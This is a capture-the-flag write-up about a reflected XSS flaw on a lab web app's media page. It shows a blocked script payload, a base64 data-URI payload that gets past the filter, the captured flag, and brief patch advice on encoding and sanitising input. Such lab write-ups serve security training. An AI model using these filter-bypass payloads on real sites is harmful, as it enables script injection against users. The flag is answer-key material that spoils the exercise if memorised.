# B13-ReflectedXSS-nsaPage

## BREACH

PATH `http://192.168.56.110/index.php?page=media&src=nsa`

For this breach we can se an `object field` in the html that load something with the query `src`

```
<object data="http://192.168.56.110/images/nsa_prism.jpg"></object>
```

We can try to perform XSS attack by landing some `JS CODE` in this query but this dit not work.

> <script>alert('test3')</script>

Maybe there is a filter on something.

Following `OWASP` documentation we try to encode our input to pass the filter

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
```

> PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg = <script>alert('test3')</script>

We got the flag !

```
THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```

## PATCH

To patch XSS attack a conbination of thing is needed. First limit the damage of an XSS attack with disabling `HTTP TRACE` (debug) from everywhere. Also you need to filter the input and never interpret it as code but as string. You can encode input to prevent it from being interpreted directly or if not possible you can sanitize it and get just string.